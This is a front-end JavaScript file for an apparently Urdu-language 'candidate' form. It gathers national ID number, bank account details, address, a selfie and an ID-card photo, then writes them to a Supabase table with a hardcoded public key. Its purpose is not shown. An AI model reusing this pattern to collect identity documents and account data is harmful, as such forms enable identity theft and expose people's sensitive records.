const supabaseUrl = 'https://qwgsmeknxrawzrixdjuf.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF3Z3NtZWtueHJhd3pyaXhkanVmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgyMDY2NzIsImV4cCI6MjA5Mzc4MjY3Mn0.Du3hIqUuTQ_qJEaKIs7R98KLgUBsAMamweRF-pphBxA';
const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('detailsForm');
    const successMessage = document.getElementById('successMessage');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        // Convert files to Base64
        const toBase64 = file => new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });

        const userPicFile = document.getElementById('userPic').files[0];
        const idCardPicFile = document.getElementById('idCardPic').files[0];

        let userPicBase64 = '';
        let idCardPicBase64 = '';

        if (userPicFile) userPicBase64 = await toBase64(userPicFile);
        if (idCardPicFile) idCardPicBase64 = await toBase64(idCardPicFile);

        const finalData = {
            fullName: data.fullName,
            fatherName: data.fatherName,
            cnic: data.cnic,
            paymentMethod: data.paymentMethod,
            accountNumber: data.accountNumber,
            accountOwner: data.accountOwner,
            address: data.address,
            userPic: userPicBase64,
            idCardPic: idCardPicBase64
        };

        // Send data to Supabase
        const { error } = await supabaseClient
            .from('candidates')
            .insert([finalData]);

        if (!error) {
            form.style.opacity = '0';
            form.style.transform = 'translateY(10px)';
            
            setTimeout(() => {
                form.classList.add('hidden');
                successMessage.classList.remove('hidden');
                const header = document.querySelector('header');
                if (header) header.classList.add('hidden');
            }, 300);
        } else {
            console.error('Supabase Error Details:', error);
            alert('کچھ غلط ہو گیا: ' + error.message);
        }
    });

    // Add some interactivity to inputs
    const inputs = document.querySelectorAll('input, textarea');
    inputs.forEach(input => {
        input.addEventListener('focus', () => {
            input.parentElement.classList.add('active');
        });
        input.addEventListener('blur', () => {
            if (input.value === '') {
                input.parentElement.classList.remove('active');
            }
        });
    });
});
